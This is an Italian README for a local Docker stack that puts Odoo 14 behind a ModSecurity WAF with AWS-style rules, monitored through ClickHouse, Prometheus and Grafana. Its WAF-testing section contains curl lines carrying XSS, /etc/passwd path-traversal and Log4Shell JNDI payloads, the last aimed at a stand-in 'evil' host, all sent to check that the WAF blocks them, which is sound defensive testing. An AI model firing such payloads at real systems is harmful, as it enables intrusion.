# deploy-waf-for-odoo — stack completo in locale

Odoo 14 dietro nginx, con il WAF davanti, e il monitoraggio completo: metriche (Prometheus), log
(ClickHouse) e dashboard (Grafana). Tutto in HTTP sulla porta 80.

```
                      ┌─────────────────────────────── docker compose ───────────────────────────────┐
 browser ──:80──►     │ waf ──► nginx ──┬──► odoo (14) ──► db (postgres 13)                            │
                      │  │              └──► grafana ──┬──► prometheus ──► metrics :9598               │
                      │  │                             └──► clickhouse                                │
                      │  └── log ──► metrics (Vector) ──┬──► :9598/metrics  (Prometheus)              │
                      │                                 ├──► clickhouse: waf.events, waf.matches      │
                      │                                 └──► data/raw/<giorno>/*.jsonl                │
                      └────────────────────────────────────────────────────────────────────────────────┘
```

| Indirizzo | Cosa | Credenziali |
|---|---|---|
| http://odoo.localhost | Odoo 14 con dati demo (vendite, CRM, contatti) | `admin` / `admin` |
| http://localhost:3000 | Grafana, cartella **WAF** (5 dashboard), accesso diretto | `admin` / `admin` (anche anonimo, sola lettura) |
| http://grafana.localhost | lo stesso Grafana, passando dal WAF | |
| http://localhost | Odoo, perché è il sito di default del WAF | |
| `localhost:8123` (HTTP), `localhost:9000` (nativo) | ClickHouse, log del WAF. Da browser: http://localhost:8123/play | `waf_ro` / `waf_ro` (lettura), `waf_admin` / `waf_admin` |

I nomi `*.localhost` puntano già alla tua macchina, senza toccare `/etc/hosts`: valgono per
Chrome, Firefox e curl.

## Avvio

Requisiti: Docker con compose v2, porta 80 libera, circa 4 GB di RAM libera e internet al primo
avvio (immagini e plugin ClickHouse di Grafana).

```sh
cd deploy-waf-for-odoo
docker compose up -d --build      # primo avvio: 1-3 minuti (build WAF + creazione database Odoo)
docker compose ps                 # waf, clickhouse e db "healthy"; init-dirs e odoo-init "Exited (0)"
```

Poi apri http://odoo.localhost e accedi con admin / admin.

Spegnere e riaccendere: `docker compose down` / `docker compose up -d`. I dati restano in `data/`.

Ripartire da zero, cancellando database Odoo, log e metriche:

```sh
docker compose down
sudo rm -rf data/*/ logs/*.log*     # i file sono creati come root dai container
docker compose up -d
```

## I servizi

| Servizio | Immagine | Ruolo | Esposto |
|---|---|---|---|
| `waf` | `nginx-aws-waf/aio` (da `../deploy-waf/Dockerfile`) | nginx + ModSecurity con le regole AWS WAF; unico ingresso | **:80** |
| `nginx` | `nginx:alpine` | il "tuo" nginx: config classica Odoo + Grafana (`nginx/default.conf`) | no |
| `odoo` | `odoo:14` | Odoo, 2 worker + longpolling sulla porta 8072 | no |
| `odoo-init` | `odoo:14` | crea il database `odoo` al primo avvio, poi esce | — |
| `db` | `postgres:13` | database di Odoo | no |
| `metrics` | `timberio/vector:0.62.0` | legge i log del WAF, scrive in ClickHouse e pubblica le metriche | no |
| `clickhouse` | `clickhouse/clickhouse-server:26.8` | database dei log del WAF | **:8123**, **:9000** |
| `prometheus` | `prom/prometheus:v3.16.0` | metriche (15 giorni) | no |
| `grafana` | `grafana/grafana:13.2.7` | dashboard | **:3000** (diretto) e via :80 |
| `init-dirs` | (WAF) | crea le cartelle in `data/` con i permessi giusti, poi esce | — |

Tutti i dati sono **bind mount**, non ci sono volumi docker:

| Cartella | Contenuto |
|---|---|
| `data/postgres`, `data/odoo` | database e filestore di Odoo |
| `data/clickhouse` | log del WAF (tabelle `waf.*`) |
| `data/prometheus`, `data/grafana` | metriche, impostazioni Grafana |
| `data/runtime`, `data/lists`, `data/state` | config generate dal WAF, liste IP, bypass |
| `data/raw`, `data/vector` | eventi JSONL per giorno, stato di Vector |
| `logs/` | `access.log`, `audit.log`, `error.log` del WAF |

## Il WAF in questo stack

La configurazione è in `config/sites/`, un file per sito. Le modifiche vengono applicate da sole
entro 10 secondi.

- **`odoo.yaml`** usa il profilo `odoo-14`: sono le regole AWS one-click (IpReputation,
  CommonRuleSet, KnownBadInputs) con le eccezioni per Odoo. Le chiamate RPC (`/web/dataset/...`) e
  l'editor HTML contengono body grandi e HTML: lì le regole `SizeRestrictions_BODY`,
  `CrossSiteScripting_BODY` e `GenericRFI_BODY` sono in **count**, cioè registrano senza bloccare.
  Fuori da quei percorsi bloccano normalmente. La location `/longpolling` (chat e notifiche) ha un
  timeout lungo.
- **`grafana.yaml`** usa il profilo AWS standard.

Nota su `localhost`: la regola AWS `Host_localhost_HEADER` blocca le richieste con
`Host: localhost`. Solo in questo stack locale l'ho messa in count in `odoo.yaml`, altrimenti
http://localhost darebbe 403. In produzione quell'override va tolto.

**Rate limit**: in `odoo.yaml` c'è, commentato, un limite per IP come le rate-based rule di AWS
(2000 richieste in 5 minuti). Il limite è per IP: dietro un NAT aziendale tutti gli utenti
condividono lo stesso IP, quindi va dimensionato su quello.

### Provare il WAF

```sh
# legittimo → 200
curl -s -o /dev/null -w '%{http_code}\n' http://odoo.localhost/web/login

# attacchi → 403
curl -s -o /dev/null -w '%{http_code}\n' 'http://odoo.localhost/web?q=<script>alert(1)</script>'        # XSS
curl -s -o /dev/null -w '%{http_code}\n' 'http://odoo.localhost/web/content?f=../../../../etc/passwd'     # LFI
curl -s -o /dev/null -w '%{http_code}\n' -H 'X-Api: ${jndi:ldap://evil/a}' http://odoo.localhost/       # Log4Shell
curl -s -o /dev/null -w '%{http_code}\n' -H 'User-Agent:' http://odoo.localhost/web/login               # senza User-Agent
```

Usa Odoo normalmente dal browser (vendite, CRM, chat, note con testo formattato): non deve
comparire nessun 403. Se ne compare uno, cercalo in Grafana ▸ **WAF Request Explorer**
([sotto](#trovare-un-falso-positivo)).

**SQL injection passa** (Odoo risponde 404 o 200): è voluto, il set SQLi non fa parte del default
AWS. Per attivarlo, in `config/sites/odoo.yaml` aggiungi:

```yaml
rule_groups:
  - name: AWSManagedRulesSQLiRuleSet
    enabled: true
```

## Grafana

http://localhost:3000 (oppure http://grafana.localhost), cartella **WAF**:

| Dashboard | Fonte | Cosa mostra |
|---|---|---|
| **WAF Richieste** (home) | ClickHouse | ogni richiesta: esito e, se bloccata, regola e causa in italiano. Dettaglio completo di una richiesta ([sotto](#la-dashboard-waf-richieste)) |
| **WAF Traffic overview** | ClickHouse | come la *Traffic overview* della console AWS: frasi di sintesi, azioni con confronto sul periodo precedente, attacchi per tipo, mappa e classifiche (IP, paesi, ASN, URI, host, user-agent, referrer, metodi), label, login Odoo, rate limit, alert ([sotto](#la-dashboard-waf-traffic-overview)) |
| **WAF Overview** | ClickHouse | richieste, bloccate, % per sito, top regole/IP/paesi/percorsi bloccati, latenze (paesi solo con [GeoIP](#geoip-paese-e-asn)) |
| **WAF Rules & Tuning** | ClickHouse | regole configurate per sito (come la pagina *Rules* della Web ACL) con override, WCU usati, impostazioni; andamento di ogni regola nel tempo (bloccate / in count / senza effetto) e dove matcha; regole in count che bloccherebbero. Serve per decidere cosa passare in enforce |
| **WAF Request Explorer** | ClickHouse | ricerca delle singole richieste per sito, IP, regola, esito, request id; dettaglio con header, body e regole matchate |
| **WAF Metrics (Prometheus)** | Prometheus | traffico in tempo reale (aggiornamento 10 s), blocchi per regola, codici HTTP, latenze p50/p95/p99, CPU e memoria |
| **WAF Nodes Health** | Prometheus + ClickHouse | salute di nodo, nginx, Vector e ClickHouse; versione di config attiva |

### La dashboard "WAF Richieste"

È la pagina iniziale di Grafana. Dall'alto:

1. **Riepilogo**: richieste totali, bloccate, percentuale, richieste "in count" (le avrebbe
   bloccate una regola configurata per solo log), IP distinti e IP bloccati.
2. **Richieste nel tempo** (consentite/bloccate) e **Perché vengono bloccate** (torta per tipo di
   attacco).
3. **Tabella delle richieste**, una riga per richiesta: ora, sito, IP, paese, metodo, URL, stato
   HTTP, esito (✅ consentita / ⛔ BLOCCATA), **regola** che ha bloccato e **causa**. La causa dice
   tipo di attacco, dove è stato trovato e valore sospetto, ad esempio
   `Cross-Site Scripting (XSS) — parametro URL «q»: <script>alert(1)</script>`.
   La colonna *Regole in count* mostra le regole che hanno trovato qualcosa senza bloccare.
   Ogni colonna ha un filtro (icona a imbuto). Clic su un **IP**: filtra quell'IP. Clic su un
   **request_id**: apre il dettaglio.
4. **Blocchi raggruppati**: per regola, causa e punto della richiesta, con numero di richieste,
   IP, un esempio di URL e di valore.
5. **Dettaglio della richiesta** (request_id selezionato): tutti i campi, tutte le regole che
   hanno matchato (quella *decisiva* in rosso, quelle in count in giallo), header, body e le altre
   richieste dello stesso IP.

Filtri in alto: **Sito**, **Esito** (Bloccate, Consentite, In count, Errore WAF), **IP**,
**Cerca** (testo in URL, host o nome della regola) e **request_id**.

Le cause in italiano vengono dalle funzioni ClickHouse `waf_causa`, `waf_dove` e `waf_spiega`
(`clickhouse/initdb/003-functions.sql`). Si possono usare anche in SQL.

### La dashboard "WAF Traffic overview"

Ricalca la *Traffic overview* della console AWS WAF. Sezioni:

| Sezione | Contenuto |
|---|---|
| **In sintesi** | frasi automatiche: totale e variazione rispetto al periodo precedente, causa principale dei blocchi, IP più bloccato, regola in count che bloccherebbe di più, login falliti e possibile brute force, rate limit, picco, paese principale |
| Azioni | richieste, consentite, bloccate, in count, rate limit, FAIL (come le metriche CloudWatch `AllowedRequests`, `BlockedRequests`, `CountedRequests`) e la variazione percentuale rispetto al periodo precedente di pari durata |
| **Andamento** | richieste per azione e attacchi bloccati per tipo nel tempo |
| **Da dove arrivano** | mappa dei paesi (colore = % bloccate), top paesi, top ASN, top IP (clic → tutte le richieste dell'IP), top user-agent |
| **Cosa chiedono** | top URI, host, referrer e metodi HTTP |
| **Regole e label** | regole che hanno deciso più blocchi e label `awswaf:...` più frequenti |
| **Login Odoo** | equivalente semplificato di AWS ATP (account takeover): tentativi, riusciti (303), falliti (200), bloccati; per IP: utenti provati, *possibile brute force*, *accesso dopo molti fallimenti* |
| **Rate limit** | limite configurato per sito, richieste respinte nel tempo, IP limitati (come `GetRateBasedStatementManagedKeys`) |
| **Alert** | stato degli alert del WAF |

Paesi, ASN e mappa richiedono [GeoIP](#geoip-paese-e-asn).

### Alert

In Grafana ▸ Alerting ▸ Alert rules, cartella **WAF**. Le regole sono in
`grafana/provisioning/alerting/waf-alerts.yaml`, dove si cambiano soglie e testi.

| Alert | Quando scatta |
|---|---|
| WAF non risponde | `nginx_up` = 0 per 1 minuto (critical) |
| Log del WAF fermi | nessun heartbeat in ClickHouse da 3 minuti |
| Picco di richieste bloccate | più di 30 bloccate al minuto per 2 minuti |
| Troppi errori 5xx | più del 5% di risposte 5xx per 5 minuti |
| Login Odoo: troppi tentativi falliti | più di 10 login falliti da un IP in 5 minuti |
| Rate limit attivo | un IP è stato respinto dal rate limit (info) |
| Errori interni del WAF | richieste con esito FAIL |

Per ricevere le notifiche serve un *contact point*: Grafana ▸ Alerting ▸ Contact points, oppure
modifica il contact point di default (email, Telegram, Slack, webhook...). Senza contact point gli
alert si vedono comunque in Grafana e nella dashboard.

### Trovare un falso positivo

1. Grafana ▸ **WAF Richieste**, filtro *Esito* = Bloccate.
2. Clic sul request_id: vedi quale regola l'ha bloccata, dove ha trovato cosa, il percorso e il body.
3. Mettila in count solo su quel percorso, in `config/sites/odoo.yaml`:
   ```yaml
   path_overrides:
     - {path_prefix: /web/percorso/che/sbaglia, rules: {NomeRegola: count}}
   ```
   Viene applicata entro 10 secondi.

## Log in ClickHouse

Tabelle nel database `waf`:

| Tabella | Una riga per | Campi principali |
|---|---|---|
| `events` | richiesta | `ts`, `site_id`, `client_ip`, `method`, `path`, `query`, `status`, `action` (ALLOW/BLOCK), `shadow_action`, `terminating_rule`, `labels`, `request_headers`, `request_body`, `request_time`, `upstream_time`, `user_class` (Odoo: `backend`, `website`, `other`) |
| `matches` | regola matchata | `request_id`, `rule_group`, `rule_name`, `configured_action`, `request_action` |
| `heartbeats` | 30 secondi | nodo, versione, revisione di config attiva |
| `site_rules` | regola, per ogni reload | configurazione attiva di ogni sito: gruppi con WCU, regole con azione di default ed effettiva e origine dell'override, regole custom, impostazioni. La vista `site_rules_current` contiene solo l'ultima. La scrive il WAF a ogni cambio di config (`waf publish` per forzarla) |

Più gli aggregati al minuto (`agg_requests_1m`, `agg_matches_1m`) usati dalle dashboard.
Conservazione (TTL in `clickhouse/initdb/001-schema.sql`): 30 giorni per `events`, `matches` e
`heartbeats`, 400 giorni per gli aggregati.

Paese e ASN (`country`, `asn`, `as_org`) sono vuoti finché non scarichi i database GeoIP
([sotto](#geoip-paese-e-asn)).

### Dati sensibili: redazione

Come i *redacted fields* di AWS WAF, prima di salvare un evento Vector (`vector/node.yaml`)
maschera con `[REDACTED]`:

- **Campi**: valori dei parametri e dei campi JSON o multipart con nomi come `password`, `pwd`,
  `token`, `csrf_token`, `secret`, `api_key`, `session_id`, `otp`. Valgono per URL, query, body e
  valori delle regole matchate.
- **Header**: `Authorization`, `X-Openerp-Session-Id`, `X-Api-Key` e simili.
- **Cookie** e **Set-Cookie**: restano visibili i nomi, i valori sono mascherati.

In ClickHouse, Grafana e `data/raw` non finiscono quindi password né sessioni di Odoo. Il nome
utente del login resta visibile, serve alla sezione *Login Odoo*.

Fa eccezione `logs/audit.log`, il log grezzo di ModSecurity da cui legge Vector: contiene le
richieste complete e non va condiviso. Viene ruotato quando supera `WAF_LOG_MAX_SIZE_MB` (default
512 MB) e le copie ruotate vengono cancellate dopo `WAF_LOG_KEEP_HOURS` (default 24 ore).

Un'installazione creata prima della redazione può contenere dati in chiaro. Per mascherarli:

```sh
docker compose exec -T clickhouse clickhouse-client -u waf_admin --password waf_admin --multiquery < clickhouse/redact-existing.sql
```

### Da riga di comando: `wafctl`

```sh
docker compose exec waf wafctl logs search --since 15m --action BLOCK      # ultime bloccate
docker compose exec waf wafctl logs show <request_id>                      # una richiesta, completa
docker compose exec waf wafctl logs tail --site odoo                       # in diretta
docker compose exec waf wafctl stats --since 1h --by rule                  # match per regola
docker compose exec waf wafctl stats --since 24h --by rule --counted       # regole in count che bloccherebbero
docker compose exec waf wafctl report --html --since 24h -o /var/log/waf/report.html   # → logs/report.html
docker compose exec waf wafctl logs export --since 1h --format aws -o /var/log/waf/aws.jsonl   # formato log AWS WAF
```

### SQL diretto

ClickHouse è esposto sulla macchina:

- **Browser**: http://localhost:8123/play, con utente `waf_ro` e password `waf_ro`.
- **DBeaver / DataGrip**: driver ClickHouse, host `localhost`, porta `8123`, database `waf`.
- **clickhouse-client**: `clickhouse-client --host localhost --port 9000 -u waf_ro --password waf_ro`.
- **HTTP/curl**: `curl 'http://localhost:8123/?user=waf_ro&password=waf_ro' --data-binary 'SELECT count() FROM waf.events'`.
- **Dal container**, senza installare nulla:

```sh
docker compose exec clickhouse clickhouse-client -u waf_admin --password waf_admin
```

Le porte si cambiano con `CH_HTTP_PORT` e `CH_TCP_PORT` nel `.env`. Fuori dal locale cambia le
password o togli le porte.

```sql
-- esiti per sito nell'ultima ora
SELECT site_id, action, count() FROM waf.events WHERE ts > now() - INTERVAL 1 HOUR GROUP BY 1, 2;

-- regole che bloccano di più oggi
SELECT terminating_rule, count() c FROM waf.events
WHERE action = 'BLOCK' AND ts > today() GROUP BY 1 ORDER BY c DESC LIMIT 10;

-- IP più bloccati
SELECT client_ip, count() c FROM waf.events WHERE action = 'BLOCK' GROUP BY 1 ORDER BY c DESC LIMIT 10;

-- ogni richiesta bloccata con la causa in italiano
SELECT e.ts, e.client_ip, e.path, e.terminating_rule,
       waf_spiega(m.rule_name, e.terminating_type, m.variable, m.value) AS causa
FROM waf.events e
LEFT JOIN waf.matches m ON m.request_id = e.request_id AND m.rule_id = e.terminating_rule_id
WHERE e.action = 'BLOCK' ORDER BY e.ts DESC LIMIT 20;

-- regole in count che hanno matchato su traffico Odoo (candidati falsi positivi)
SELECT rule_name, path, count() c FROM waf.matches
WHERE configured_action = 'COUNT' GROUP BY 1, 2 ORDER BY c DESC LIMIT 20;
```

Utenti ClickHouse:

| Utente | Password | Permessi | Chi lo usa |
|---|---|---|---|
| `waf_admin` | `waf_admin` | amministratore | tu |
| `waf_ingest` | `waf_ingest` | scrittura su `waf.*` | Vector |
| `waf_ro` | `waf_ro` | sola lettura su `waf.*` | Grafana, wafctl |

Le password valgono solo per questo stack locale. Si cambiano nel `.env` **prima** del primo
avvio: vengono applicate quando `data/clickhouse` viene creata.

## GeoIP (paese e ASN)

Servono due database in `data/geoip/`: `GeoLite2-Country.mmdb` e `GeoLite2-ASN.mmdb`. Puoi
scaricarli in due modi.

**DB-IP Lite**: gratuito, senza account, aggiornato ogni mese.

```sh
docker compose run --rm geoip-dbip
docker compose restart metrics
```

Licenza CC BY 4.0: se mostri i dati a terzi va citato "IP Geolocation by DB-IP".

**MaxMind GeoLite2**: serve un account gratuito su maxmind.com (*Manage License Keys* ▸ crea una
chiave). Nel `.env`:

```sh
GEOIPUPDATE_ACCOUNT_ID=123456
GEOIPUPDATE_LICENSE_KEY=xxxxxxxx
```

poi:

```sh
docker compose run --rm geoip-maxmind
docker compose restart metrics
```

Il servizio `metrics` controlla all'avvio se i file ci sono (`docker compose logs metrics | grep
GeoIP` mostra `geoip-on`). Da quel momento ogni evento in ClickHouse ha `country`, `asn` e
`as_org`, e in Grafana si popolano i pannelli per paese. Gli IP privati, come `172.x` della rete
docker, restano comunque senza paese.

Per aggiornare i database basta rilanciare lo stesso comando, una volta al mese, a mano o con cron:

```cron
0 4 3 * * cd /percorso/deploy-waf-for-odoo && docker compose run --rm geoip-dbip && docker compose restart metrics
```

### Bloccare per paese nel WAF

Nel `.env` metti `WAF_GEOIP=true`, poi `docker compose up -d waf`. In `config/sites/odoo.yaml`:

```yaml
geo_block: {countries: [CN, RU, KP], action: block}     # oppure action: count per provare
```

In locale tutte le richieste arrivano da `172.x` e non hanno paese. Per provare simula l'IP
del client: **solo per test**, aggiungi anche

```yaml
client_ip: {source: xff, trusted_proxies: ["172.16.0.0/12"]}
```

e poi:

```sh
curl -s -o /dev/null -w '%{http_code}\n' -H 'X-Forwarded-For: 223.5.5.5' http://odoo.localhost/web/login   # CN → 403
curl -s -o /dev/null -w '%{http_code}\n' -H 'X-Forwarded-For: 8.8.8.8'   http://odoo.localhost/web/login   # US → 200
```

Togli `client_ip` dopo il test: con quella riga chiunque potrebbe falsificare il proprio IP.

## Metriche Prometheus

Il servizio `metrics` pubblica su `metrics:9598` (rete interna):

| Metrica | Label |
|---|---|
| `waf_requests_total` | `site`, `action`, `shadow_action`, `mode`, `status` |
| `waf_blocked_requests_total` | `site`, `rule`, `type` |
| `waf_rule_matches_total` | `site`, `rule_group`, `rule`, `configured_action`, `request_action` |
| `waf_request_duration_seconds`, `waf_upstream_duration_seconds` | `site` (istogrammi) |
| `nginx_*`, `host_*`, `vector_*` | `node_id` |

Prometheus le raccoglie ogni 15 secondi, insieme alle metriche di ClickHouse (`clickhouse:9363`).
Per interrogarle direttamente:

```sh
docker compose exec prometheus wget -qO- 'http://localhost:9090/api/v1/query?query=sum%20by%20(action)%20(waf_requests_total)'
```

## Comandi utili

```sh
docker compose logs -f waf                 # reload della config, errori
docker compose exec waf waf status         # versione di config attiva, siti, liste IP
docker compose exec waf waf publish        # ripubblica in ClickHouse le regole attive (pannelli Regole/WCU)
docker compose exec waf waf explain odoo   # tutte le regole del sito e la loro azione effettiva
docker compose exec waf waf bypass odoo --ttl 30m --reason "test"   # sito in sola registrazione per 30 min
docker compose exec waf waf bypass clear odoo
docker compose logs -f odoo                # log di Odoo
docker compose restart nginx               # dopo una modifica a nginx/default.conf
```

## Moduli Odoo personalizzati

Decommenta in `docker-compose.yml`, servizio `odoo`:

```yaml
      - ./addons:/mnt/extra-addons
```

Metti i moduli in `addons/`, poi `docker compose up -d odoo` e installali da Odoo ▸ App
(modalità sviluppatore ▸ Aggiorna lista app).

## Problemi comuni

| Sintomo | Soluzione |
|---|---|
| `port is already allocated` su 3000 | `GRAFANA_PORT=3001` nel `.env` |
| `port is already allocated` su 8123 o 9000 | `CH_HTTP_PORT` / `CH_TCP_PORT` nel `.env` |
| Colonna "Causa" vuota o pannelli Regole/WCU vuoti con uno stack creato in precedenza | gli script di `clickhouse/initdb/` girano solo al primo avvio. Esegui quelli nuovi: `for f in clickhouse/initdb/00[34]-*.sql; do docker compose exec -T clickhouse clickhouse-client -u waf_admin --password waf_admin --multiquery < $f; done`, poi `docker compose exec waf waf publish` |
| `port is already allocated` su 80 | un altro servizio usa la porta 80: fermalo, oppure `HTTP_PORT=8080` nel `.env` e usa http://odoo.localhost:8080 |
| http://odoo.localhost non si apre | usa Chrome/Firefox oppure http://localhost; alcuni sistemi non risolvono `*.localhost`: aggiungi `127.0.0.1 odoo.localhost grafana.localhost` a `/etc/hosts` |
| 502 su Odoo subito dopo l'avvio | Odoo sta ancora partendo, attendi 10-20 secondi |
| `odoo-init` in errore | `docker compose logs odoo-init`; per riprovare: `docker compose down`, `sudo rm -rf data/postgres data/odoo`, `docker compose up -d` |
| Grafana: "plugin not found" per ClickHouse | al primo avvio Grafana scarica il plugin da internet; senza rete le dashboard ClickHouse restano vuote |
| Dashboard ClickHouse vuote | i dati arrivano qualche secondo dopo le richieste; controlla `docker compose logs metrics` |
| 403 mentre usi Odoo | Request Explorer ▸ regola ▸ `path_overrides` ([sopra](#trovare-un-falso-positivo)); in emergenza `waf bypass` |

## Differenze rispetto a `../deploy-waf`

`../deploy-waf` è il WAF da mettere davanti a un nginx esistente, in produzione, con HTTPS e solo
le metriche Prometheus. Questa cartella aggiunge Odoo, ClickHouse, Prometheus e Grafana per vedere
lo stack completo in locale. Il WAF, la sua immagine e la pipeline Vector sono gli stessi.
